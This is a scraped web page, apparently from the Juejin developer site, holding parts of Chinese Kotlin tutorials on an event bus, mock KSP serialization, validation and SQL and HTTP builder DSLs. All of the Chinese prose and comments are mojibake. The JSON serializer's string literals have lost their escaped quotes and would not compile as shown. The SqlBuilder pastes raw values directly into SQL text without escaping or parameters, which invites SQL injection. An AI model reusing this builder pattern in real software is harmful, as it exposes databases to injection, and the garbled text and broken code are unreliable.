<span class="hljs-keyword">interface</span> <span class="hljs-title class_">EventHandler</span>&lt;<span class="hljs-type">T : Event</span>&gt; {
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">T</span>)</span></span>
}

<span class="hljs-comment">// äº‹ä»¶æ€»çº¿</span>
<span class="hljs-keyword">object</span> EventBus {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> handlers = mutableMapOf&lt;KClass&lt;<span class="hljs-keyword">out</span> Event&gt;, MutableList&lt;EventHandler&lt;*&gt;&gt;&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> eventChannel = Channel&lt;Event&gt;(Channel.UNLIMITED)
    
    <span class="hljs-comment">// æ³¨å†Œäº‹ä»¶å¤„ç†å™¨</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T : Event&gt;</span> <span class="hljs-title">registerHandler</span><span class="hljs-params">(eventClass: <span class="hljs-type">KClass</span>&lt;<span class="hljs-type">T</span>&gt;, handler: <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">T</span>&gt;)</span></span> {
        handlers.getOrPut(eventClass) { mutableListOf() }.add(handler <span class="hljs-keyword">as</span> EventHandler&lt;*&gt;)
    }
    
    <span class="hljs-comment">// å‘å¸ƒäº‹ä»¶</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">publish</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>)</span></span> {
        eventChannel.trySend(event)
    }
    
    <span class="hljs-comment">// å¯åŠ¨äº‹ä»¶å¤„ç†å¾ªç¯</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">start</span><span class="hljs-params">()</span></span> = GlobalScope.launch {
        <span class="hljs-keyword">for</span> (event <span class="hljs-keyword">in</span> eventChannel) {
            processEvent(event)
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processEvent</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>)</span></span> {
        <span class="hljs-keyword">val</span> eventClass = event::<span class="hljs-keyword">class</span>
        <span class="hljs-title class_">val</span> <span class="hljs-title">eventHandlers</span> = <span class="hljs-title">handlers</span>[<span class="hljs-title">eventClass</span>] ?: <span class="hljs-type">return</span>
        
        eventHandlers.forEach { handler -&gt;
            <span class="hljs-keyword">try</span> {
                <span class="hljs-meta">@Suppress(<span class="hljs-string">"UNCHECKED_CAST"</span>)</span>
                (handler <span class="hljs-keyword">as</span> EventHandler&lt;Event&gt;).handle(event)
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                println(<span class="hljs-string">"äº‹ä»¶å¤„ç†å¤±è´¥: <span class="hljs-subst">${e.message}</span>"</span>)
            }
        }
    }
}

<span class="hljs-comment">// å…·ä½“çš„äº‹ä»¶å¤„ç†å™¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserActivityLogger</span> : <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">Event.UserLoggedIn</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>.<span class="hljs-type">UserLoggedIn</span>)</span></span> {
        delay(<span class="hljs-number">100</span>) <span class="hljs-comment">// æ¨¡æ‹Ÿå¤„ç†æ—¶é—´</span>
        println(<span class="hljs-string">"ğŸ“ ç”¨æˆ·ç™»å½•æ—¥å¿—: <span class="hljs-subst">${event.userId}</span> åœ¨ <span class="hljs-subst">${System.currentTimeMillis()}</span> ç™»å½•"</span>)
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderProcessor</span> : <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">Event.OrderCreated</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>.<span class="hljs-type">OrderCreated</span>)</span></span> {
        delay(<span class="hljs-number">200</span>)
        println(<span class="hljs-string">"ğŸ’° è®¢å•å¤„ç†: è®¢å• <span class="hljs-subst">${event.orderId}</span> é‡‘é¢ <span class="hljs-subst">${event.amount}</span>"</span>)
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">PaymentNotifier</span> : <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">Event.PaymentProcessed</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>.<span class="hljs-type">PaymentProcessed</span>)</span></span> {
        delay(<span class="hljs-number">150</span>)
        <span class="hljs-keyword">val</span> status = <span class="hljs-keyword">if</span> (event.success) <span class="hljs-string">"æˆåŠŸ"</span> <span class="hljs-keyword">else</span> <span class="hljs-string">"å¤±è´¥"</span>
        println(<span class="hljs-string">"ğŸ“§ æ”¯ä»˜é€šçŸ¥: æ”¯ä»˜ <span class="hljs-subst">${event.paymentId}</span> <span class="hljs-variable">$status</span>"</span>)
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SystemMonitor</span> : <span class="hljs-type">EventHandler</span>&lt;<span class="hljs-type">Event.SystemShutdown</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handle</span><span class="hljs-params">(event: <span class="hljs-type">Event</span>.<span class="hljs-type">SystemShutdown</span>)</span></span> {
        println(<span class="hljs-string">"ğŸ›‘ ç³»ç»Ÿå…³é—­: å¼€å§‹æ¸…ç†èµ„æº..."</span>)
        delay(<span class="hljs-number">500</span>)
        println(<span class="hljs-string">"ğŸ›‘ ç³»ç»Ÿå…³é—­: èµ„æºæ¸…ç†å®Œæˆ"</span>)
    }
}

<span class="hljs-comment">// ä½¿ç”¨äº‹ä»¶æ€»çº¿</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-comment">// æ³¨å†Œå¤„ç†å™¨</span>
    EventBus.registerHandler(Event.UserLoggedIn::<span class="hljs-keyword">class</span>, UserActivityLogger())
    EventBus.registerHandler(Event.OrderCreated::<span class="hljs-keyword">class</span>, OrderProcessor())
    EventBus.registerHandler(Event.PaymentProcessed::<span class="hljs-keyword">class</span>, PaymentNotifier())
    EventBus.registerHandler(Event.SystemShutdown::<span class="hljs-keyword">class</span>, SystemMonitor())
    
    <span class="hljs-comment">// å¯åŠ¨äº‹ä»¶æ€»çº¿</span>
    EventBus.start()
    
    <span class="hljs-comment">// æ¨¡æ‹Ÿå‘å¸ƒäº‹ä»¶</span>
    EventBus.publish(Event.UserLoggedIn(<span class="hljs-string">"user123"</span>))
    EventBus.publish(Event.OrderCreated(<span class="hljs-string">"order456"</span>, <span class="hljs-number">99.99</span>))
    EventBus.publish(Event.PaymentProcessed(<span class="hljs-string">"pay789"</span>, <span class="hljs-literal">true</span>))
    EventBus.publish(Event.OrderCreated(<span class="hljs-string">"order999"</span>, <span class="hljs-number">49.99</span>))
    EventBus.publish(Event.PaymentProcessed(<span class="hljs-string">"pay000"</span>, <span class="hljs-literal">false</span>))
    
    delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// ç­‰å¾…äº‹ä»¶å¤„ç†å®Œæˆ</span>
    
    EventBus.publish(Event.SystemShutdown())
    delay(<span class="hljs-number">1000</span>)
    
    println(<span class="hljs-string">"ç¨‹åºç»“æŸ"</span>)
}
</code></pre>
<h4 data-id="heading-16"><strong>ä¸‹ä¸€æ­¥å­¦ä¹ æ–¹å‘</strong></h4>
<p>ä½ ç°åœ¨å·²ç»æŒæ¡äº† Kotlin çš„ä¼ä¸šçº§å¼€å‘æŠ€èƒ½ï¼æ¥ä¸‹æ¥å¯ä»¥æ·±å…¥ï¼š</p>
<ol>
<li><strong>Kotlin ç¼–è¯‘å™¨æ’ä»¶å¼€å‘</strong>ï¼šè‡ªå®šä¹‰ç¼–è¯‘æœŸå¤„ç†</li>
<li><strong>Kotlin å…ƒç¼–ç¨‹</strong>ï¼šåœ¨ç¼–è¯‘æ—¶ç”Ÿæˆä»£ç </li>
<li><strong>Kotlin ä¸ Java äº’æ“ä½œé«˜çº§æŠ€å·§</strong>ï¼šç±»å‹æ˜ å°„ã€å¼‚å¸¸å¤„ç†</li>
<li><strong>Kotlin æœåŠ¡ç«¯å¼€å‘</strong>ï¼šä½¿ç”¨ Ktorã€Spring Boot</li>
<li><strong>Kotlin å‰ç«¯å¼€å‘</strong>ï¼šä½¿ç”¨ Compose for Web</li>
<li><strong>Kotlin ç§»åŠ¨ç«¯å¼€å‘</strong>ï¼šCompose Multiplatform</li>
</ol>
<p>è¿™äº›é«˜çº§ç‰¹æ€§å°†è®©ä½ åœ¨ Kotlin å¼€å‘ä¸­æ¸¸åˆƒæœ‰ä½™ï¼Œèƒ½å¤Ÿæ„å»ºå¤æ‚ã€é«˜æ€§èƒ½çš„ä¼ä¸šçº§åº”ç”¨ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin-6]]></title>    <link>https://juejin.cn/post/7576086446460256291</link>    <guid>https://juejin.cn/post/7576086446460256291</guid>    <pubDate>2025-11-24T11:57:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576086446460256291" data-draft-id="7571281406510170163" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin-6"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2025-11-24T11:57:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é£å†·"/> <meta itemprop="url" content="https://juejin.cn/user/3843548379091742"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin-6
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548379091742/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é£å†·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T11:57:37.000Z" title="Mon Nov 24 2025 11:57:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤ªæ£’äº†ï¼ç°åœ¨è®©æˆ‘ä»¬æ¢ç´¢ Kotlin çš„ç»ˆæå¢ƒç•Œâ€”â€”<strong>å…ƒç¼–ç¨‹ã€ç¼–è¯‘å™¨æ’ä»¶ã€æ·±åº¦ä¼˜åŒ–</strong>å’Œ<strong>æœªæ¥ç‰¹æ€§</strong>ã€‚è¿™å°†å¸¦ä½ è¿›å…¥ Kotlin è¯­è¨€è®¾è®¡çš„æ ¸å¿ƒé¢†åŸŸã€‚</p>
<hr/>
<h3 data-id="heading-0"><strong>Kotlin ç»ˆææ¢ç´¢ï¼šå…ƒç¼–ç¨‹ä¸è¯­è¨€æ·±åº¦</strong></h3>
<h4 data-id="heading-1"><strong>ä¸‰åä¹ã€æ³¨è§£å¤„ç†å™¨ä¸ä»£ç ç”Ÿæˆï¼ˆKSPï¼‰</strong></h4>
<h5 data-id="heading-2"><strong>1. ä½¿ç”¨ KSPï¼ˆKotlin Symbol Processingï¼‰</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. å®šä¹‰æ³¨è§£</span>
<span class="hljs-meta">@Target(AnnotationTarget.CLASS)</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonSerializable</span>

<span class="hljs-meta">@Target(AnnotationTarget.PROPERTY)</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonName</span>(<span class="hljs-keyword">val</span> name: String)

<span class="hljs-meta">@Target(AnnotationTarget.PROPERTY)</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JsonExclude</span>

<span class="hljs-comment">// 2. å®šä¹‰æ•°æ®ç±»ï¼ˆè¿™äº›å°†åœ¨ç¼–è¯‘æ—¶è¢«å¤„ç†ï¼‰</span>
<span class="hljs-meta">@JsonSerializable</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>(
    <span class="hljs-meta">@JsonName(<span class="hljs-string">"person_name"</span>)</span>
    <span class="hljs-keyword">val</span> name: String,
    <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>,
    <span class="hljs-meta">@JsonExclude</span>
    <span class="hljs-keyword">val</span> password: String
)

<span class="hljs-comment">// 3. æ‰‹åŠ¨æ¨¡æ‹Ÿ KSP å¤„ç†ç»“æœï¼ˆå®é™…ç”±æ³¨è§£å¤„ç†å™¨ç”Ÿæˆï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PersonSerializer</span> {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">toJson</span><span class="hljs-params">(person: <span class="hljs-type">Person</span>)</span></span>: String {
        <span class="hljs-keyword">return</span> buildString {
            append(<span class="hljs-string">"{"</span>)
            append(<span class="hljs-string">""</span>person_name<span class="hljs-string">": "</span>${person.name}<span class="hljs-string">", "</span>)
            append(<span class="hljs-string">""</span>age<span class="hljs-string">": <span class="hljs-subst">${person.age}</span>"</span>)
            append(<span class="hljs-string">"}"</span>)
        }
    }
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fromJson</span><span class="hljs-params">(json: <span class="hljs-type">String</span>)</span></span>: Person {
            <span class="hljs-comment">// ç®€åŒ–çš„ JSON è§£æé€»è¾‘</span>
            <span class="hljs-keyword">val</span> name = json.substringAfter(<span class="hljs-string">""</span>person_name<span class="hljs-string">": "</span><span class="hljs-string">").substringBefore("</span><span class="hljs-string">""</span>)
            <span class="hljs-keyword">val</span> age = json.substringAfter(<span class="hljs-string">""</span>age<span class="hljs-string">": "</span>).substringBefore(<span class="hljs-string">"}"</span>).toInt()
            <span class="hljs-keyword">return</span> Person(name, age, <span class="hljs-string">""</span>)
        }
    }
}

<span class="hljs-comment">// 4. ä½¿ç”¨ç”Ÿæˆçš„åºåˆ—åŒ–å™¨</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testManualKSP</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> person = Person(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>, <span class="hljs-string">"secret"</span>)
    <span class="hljs-keyword">val</span> serializer = PersonSerializer()
    <span class="hljs-keyword">val</span> json = serializer.toJson(person)
    println(<span class="hljs-string">"ç”Ÿæˆçš„ JSON: <span class="hljs-variable">$json</span>"</span>)
    
    <span class="hljs-keyword">val</span> parsedPerson = PersonSerializer.fromJson(json)
    println(<span class="hljs-string">"è§£æçš„å¯¹è±¡: <span class="hljs-variable">$parsedPerson</span>"</span>)
}
</code></pre>
<h5 data-id="heading-3"><strong>2. æ„å»ºæ—¶å…ƒç¼–ç¨‹æ¨¡å¼</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ç¼–è¯‘æ—¶éªŒè¯æ³¨è§£</span>
<span class="hljs-meta">@Target(AnnotationTarget.CLASS)</span>
<span class="hljs-keyword">annotation</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Validate</span>(<span class="hljs-keyword">val</span> fields: Array&lt;String&gt;)

<span class="hljs-meta">@Validate(fields = [<span class="hljs-string">"age"</span>, <span class="hljs-string">"email"</span>])</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>, <span class="hljs-keyword">val</span> email: String)

<span class="hljs-comment">// è¿è¡Œæ—¶éªŒè¯é€»è¾‘ï¼ˆæ¨¡æ‹Ÿç¼–è¯‘æ—¶ç”Ÿæˆï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserValidator</span> {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">validate</span><span class="hljs-params">(user: <span class="hljs-type">User</span>)</span></span>: List&lt;String&gt; {
            <span class="hljs-keyword">val</span> errors = mutableListOf&lt;String&gt;()
            
            <span class="hljs-keyword">if</span> (user.age &lt; <span class="hljs-number">0</span>) errors.add(<span class="hljs-string">"å¹´é¾„ä¸èƒ½ä¸ºè´Ÿæ•°"</span>)
            <span class="hljs-keyword">if</span> (!user.email.contains(<span class="hljs-string">"@"</span>)) errors.add(<span class="hljs-string">"é‚®ç®±æ ¼å¼ä¸æ­£ç¡®"</span>)
            
            <span class="hljs-keyword">return</span> errors
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¼–è¯‘æ—¶éªŒè¯</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testValidation</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> user = User(<span class="hljs-string">"Bob"</span>, -<span class="hljs-number">5</span>, <span class="hljs-string">"invalid-email"</span>)
    <span class="hljs-keyword">val</span> errors = UserValidator.validate(user)
    
    <span class="hljs-keyword">if</span> (errors.isNotEmpty()) {
        println(<span class="hljs-string">"éªŒè¯é”™è¯¯: <span class="hljs-subst">${errors.joinToString()}</span>"</span>)
    } <span class="hljs-keyword">else</span> {
        println(<span class="hljs-string">"éªŒè¯é€šè¿‡"</span>)
    }
}
</code></pre>
<h4 data-id="heading-4"><strong>å››åã€ç¼–è¯‘å™¨æ’ä»¶å¼€å‘åŸºç¡€</strong></h4>
<h5 data-id="heading-5"><strong>1. è‡ªå®šä¹‰ç¼–è¯‘å™¨æ‰©å±•æ¨¡å¼</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. å®šä¹‰é¢†åŸŸç‰¹å®šè¯­è¨€</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlBuilder</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> table: String = <span class="hljs-string">""</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> conditions = mutableListOf&lt;String&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> joins = mutableListOf&lt;String&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> limit: <span class="hljs-built_in">Int</span>? = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">eq</span><span class="hljs-params">(value: <span class="hljs-type">Any</span>)</span></span> = <span class="hljs-string">"<span class="hljs-variable">$this</span> = '<span class="hljs-variable">$value</span>'"</span>
    <span class="hljs-keyword">infix</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> String.`<span class="hljs-keyword">in</span>`<span class="hljs-params">(values: <span class="hljs-type">List</span>&lt;<span class="hljs-type">Any</span>&gt;)</span></span> = 
        <span class="hljs-string">"<span class="hljs-variable">$this</span> IN (<span class="hljs-subst">${values.joinToString { <span class="hljs-string">"'<span class="hljs-variable">$it</span>'"</span> }</span>})"</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">from</span><span class="hljs-params">(tableName: <span class="hljs-type">String</span>)</span></span> {
        table = tableName
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">where</span><span class="hljs-params">(condition: <span class="hljs-type">String</span>)</span></span> {
        conditions.add(condition)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">join</span><span class="hljs-params">(table: <span class="hljs-type">String</span>, on: <span class="hljs-type">String</span>)</span></span> {
        joins.add(<span class="hljs-string">"JOIN <span class="hljs-variable">$table</span> ON <span class="hljs-variable">$on</span>"</span>)
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">limit</span><span class="hljs-params">(count: <span class="hljs-type">Int</span>)</span></span> {
        limit = count
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">build</span><span class="hljs-params">()</span></span>: String {
        <span class="hljs-keyword">val</span> query = StringBuilder(<span class="hljs-string">"SELECT * FROM <span class="hljs-variable">$table</span>"</span>)
        
        <span class="hljs-keyword">if</span> (joins.isNotEmpty()) {
            query.append(<span class="hljs-string">" "</span>).append(joins.joinToString(<span class="hljs-string">" "</span>))
        }
        
        <span class="hljs-keyword">if</span> (conditions.isNotEmpty()) {
            query.append(<span class="hljs-string">" WHERE "</span>).append(conditions.joinToString(<span class="hljs-string">" AND "</span>))
        }
        
        limit?.let {
            query.append(<span class="hljs-string">" LIMIT <span class="hljs-variable">$it</span>"</span>)
        }
        
        <span class="hljs-keyword">return</span> query.toString()
    }
}

<span class="hljs-comment">// 2. ä½¿ç”¨ DSL æ„å»º SQL</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testSqlBuilder</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> query = SqlBuilder().apply {
        from(<span class="hljs-string">"users"</span>)
        <span class="hljs-keyword">where</span>(<span class="hljs-string">"name"</span> eq <span class="hljs-string">"Alice"</span>)
        <span class="hljs-keyword">where</span>(<span class="hljs-string">"age"</span> `<span class="hljs-keyword">in</span>` listOf(<span class="hljs-number">25</span>, <span class="hljs-number">30</span>, <span class="hljs-number">35</span>))
        join(<span class="hljs-string">"orders"</span>, <span class="hljs-string">"users.id = orders.user_id"</span>)
        limit(<span class="hljs-number">10</span>)
    }.build()
    
    println(<span class="hljs-string">"ç”Ÿæˆçš„ SQL: <span class="hljs-variable">$query</span>"</span>)
}
</code></pre>
<h5 data-id="heading-6"><strong>2. ç±»å‹å®‰å…¨æ„å»ºå™¨è¿›é˜¶</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ç±»å‹å®‰å…¨çš„ HTTP è¯·æ±‚æ„å»ºå™¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpRequestBuilder</span> {
    <span class="hljs-keyword">var</span> method: String = <span class="hljs-string">"GET"</span>
    <span class="hljs-keyword">var</span> url: String = <span class="hljs-string">""</span>
    <span class="hljs-keyword">val</span> headers = mutableMapOf&lt;String, String&gt;()
    <span class="hljs-keyword">var</span> body: String = <span class="hljs-string">""</span>
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">method</span><span class="hljs-params">(method: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.method = method
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">url</span><span class="hljs-params">(url: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-keyword">this</span>.url = url
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">header</span><span class="hljs-params">(name: <span class="hljs-type">String</span>, value: <span class="hljs-type">String</span>)</span></span> {
        headers[name] = value
    }
    
